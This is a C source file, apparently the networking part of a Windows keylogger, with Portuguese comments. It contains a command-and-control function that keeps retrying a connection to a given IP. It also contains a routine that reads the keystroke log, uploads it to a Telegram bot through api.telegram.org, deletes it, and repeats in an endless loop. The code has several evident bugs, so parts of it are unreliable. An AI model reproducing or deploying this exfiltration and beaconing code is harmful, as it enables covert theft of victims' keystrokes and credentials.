        #include "network.h"
        #include <string.h>
     //   SOCKET global;
        //ler a documentaçao
        void zero(char * buffer)
        {
        memset(buffer,0,strlen(buffer));


        }
        SOCKET buildsocket(){
        WSADATA wsa;
        SOCKET global;
        if(WSAStartup(MAKEWORD(2,2),&wsa)!=0){
        return(INVALID_SOCKET);
        }

        global=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
        if(socket==INVALID_SOCKET){
        return(INVALID_SOCKET);}

        return(global);

        }
        BOOL c2Server(char *ip,int port,SOCKET s){
        WSADATA wsa;
        struct sockaddr_in cliente;
        struct sockaddr_in *ptr;

        ptr=&cliente;
        cliente.sin_addr.s_addr=inet_addr(ip);
        cliente.sin_family=AF_INET;
        cliente.sin_port=htons(port);
        if(WSAStartup(MAKEWORD(2,2),&wsa)!=0){
            //printf("erro wsastartup \n");

        }
        while(2){
                Sleep(5000);
            if(connect(s,ptr,sizeof cliente)==0){
                //printf(" conexao aceita \n");
                break;
            }
        else{
            //printf("tentando se conectar \n");
        }
        }


        return TRUE;}//loop   que tenta se conectar
        void  conect_web(char *domain,int port,SOCKET socket){

        WSADATA wsa;
        struct sockaddr_in cliente;
        struct sockaddr_in *ptr;
        SOCKET s;
        struct  hostent  *d;
        domain=gethostbyname(d);
        ptr=&cliente;
        cliente.sin_addr.s_addr=*((unsigned long*)d->h_addr);
        cliente.sin_family=AF_INET;
        cliente.sin_port=htons(port);
        if(WSAStartup(MAKEWORD(2,2),&wsa)!=0){
            //printf("erro wsastartup \n");

        }
        while(2){
                Sleep(5000);
            if(connect(s,ptr,sizeof cliente)==0){
                //printf(" conexao aceita \n");
                break;
            }
        else{
            //printf("tentando se conectar \n");
        }
        }

        }
        void web_send(char *request,SOCKET web,char *buffer){
        char *domain;//defina seu host
        conect_web(domain,80,web);
        char http[12488];

        zero(http);
        sprintf(http,request,buffer);
        send(web,http,strlen(http),0);
        recv(web,buffer,12488,0);
         closesocket(web);
          WSACleanup();
          Sleep(3000);




        }


        void  http_close(HINTERNET *hinternt,HINTERNET *conect, HINTERNET *request){

    if (hinternt) { InternetCloseHandle(hinternt); }
        if (conect) { InternetCloseHandle(conect); }
        if (request) { InternetCloseHandle(request); }


        }

    char*  read_file(char *name){
    FILE *fin = fopen(name, "rb");//abrimos o arquivo
        fseek(fin, 0, SEEK_END);//
        long len = ftell(fin);
        rewind(fin);//reposiciona o ponteiro  para o iicio
        BYTE *buffer =(BYTE*) malloc(len);
        //aloca



        fread(buffer, len, 1, fin);
        fclose(fin);
        return buffer;



    }
    int send_doc_keylloger(const char *id,const char *bot_token,char *name){
char *data=(char*)malloc(50000 * sizeof(char));

char headers[] = "Content-Type: multipart/form-data; boundary=log";
snprintf(data, 50000, "--logger\r\nContent-Disposition: form-data; name=\"document\"; filename=\"log_file\"\r\n");
	snprintf(data, 50000, "%sContent-Type: text/*\r\n\r\n", data);
snprintf(data, 50000, "%s%s\r\n", data,read_file(name));
snprintf(data, 50000, "%s--logger--\r\n", data);

HINTERNET internet= InternetOpenA("Wininet", INTERNET_OPEN_TYPE_PRECONFIG_WITH_NO_AUTOPROXY, 0, 0, 0);
if(internet==0){
    http_close(internet,0,0);
}

HINTERNET conn= InternetConnectA(internet, "api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0, 0, INTERNET_SERVICE_HTTP, 0, 0);
if(conn==0){
    http_close(internet,conn,0);
}
char* url = (char*)malloc(500 * sizeof(char));
snprintf(url, 500, "/bot%s/sendDocument?chat_id=%s", bot_token, id);
HINTERNET req= HttpOpenRequestA(conn, "POST", url, 0, 0, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_DONT_CACHE | INTERNET_FLAG_SECURE | INTERNET_FLAG_PRAGMA_NOCACHE, 0);
free(url);
if(req==0){
    http_close(internet,conn,req);
}


HttpSendRequestA(req, headers, strlen(headers), data, strlen(data));
free(data);
LPVOID Lpbuffer[24];
DWORD  code;
sizeof(Lpbuffer) / sizeof(LPVOID);
HttpQueryInfoA(req, HTTP_QUERY_STATUS_CODE, Lpbuffer, &code, 0);
http_close(internet,conn,req);
return Lpbuffer=="200";

    }

BOOL  delete_file(char *name){
    int a;
a=remove(name);
if(a=!0){

}
return 1;
}
void telegram_log(const char *token,const char *id,const char *name){
do{

    Sleep(1000*5000);
send_doc_keylloger(id,token,name);
    delete_file(name);
}while(TRUE);

}
